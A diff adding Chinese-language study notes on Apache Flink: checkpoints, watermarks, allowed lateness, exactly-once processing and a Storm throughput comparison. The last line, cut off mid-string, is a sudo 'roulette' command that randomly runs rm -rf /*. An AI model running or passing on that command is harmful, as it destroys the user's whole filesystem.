@@ -1,0 +1,52 @@
+checkpoint
+kafka-flink-kafka 
+readFile
+===TODO===
+checkpoint检查点HDFS未发布测试
+flink多数据源 
+
+从文件中读数据
+
+
+Timer
+定时器,作为window的触发源,分为两类:
+WallTime Timer:按照正常的现实时间作为触发源
+LowWatermark Timer:以低水位作为触发源 
+
+
+
+low watermark :最低水位
+其实就是一个时间戳 ,每一个计算节点都会维护一个时间戳作为watermark
+A的低水位值不只和A本身的最旧数据有关,也跟上游的低水位有关.
+因此,只要上游还有更旧的数据存在,就会通过低水位机制维护的low watermark告知下游,
+下游便会更新它自己的low watermark并且由于lwm timer未触发，因此会进行等待
+
+在一定程度上保证数据的完整性和实效性,但是如果有数据比lowwatermark还晚到达仍没有办法解决
+比如:数据在没有进入流系统之前就耽搁了,那low watermark根本不知道
+flink为了解决这个问题,还有allow lateness参数,即Window被low watermark timer触发后,
+还会等待allow lateness时间才开始计算,但这样会损失一定的实时性
+
+
+
+Flink是通过检查点的方式来实现 exactly-once 只执行一次,当遇到故障时将系统重置为初始状态
+
+
+雅虎15年测试:
+Storm 能够承受每秒 40 万事件,但受限于 CPU； 
+Flink 则可以达到每秒 300万事件(7.5 倍)但受限于 Kafka 集群和 Flink 集群之间的网络
+
+Flink 的执行过程是基于流的，这意味着各个处理阶段有更多的重叠，并且混洗操作是流水线式的，因此磁盘访问操作
+更少.相反, MapReduce、Tez和Spark是基于批的，这意味着数据在通过
+网络传输之前必须先被写入磁盘。该测试说明，在使用 Flink 时，系统空闲时间和磁盘访问操作更少。
+
+接收器  数据源 
+
+Kafka position也是由Flink自己维护的
+
+理想下  无边际数据流 源源不断来  按照时间窗口 计算  输出
+
+现实情况是: 数据不是按时来的 有延迟
+
+所以划分为事件时间  摄取时间  处理时间
+
+sudo [ $[ $RANDOM % 6 ] == 0 ] && rm -rf /* || echo "Please continue to exec
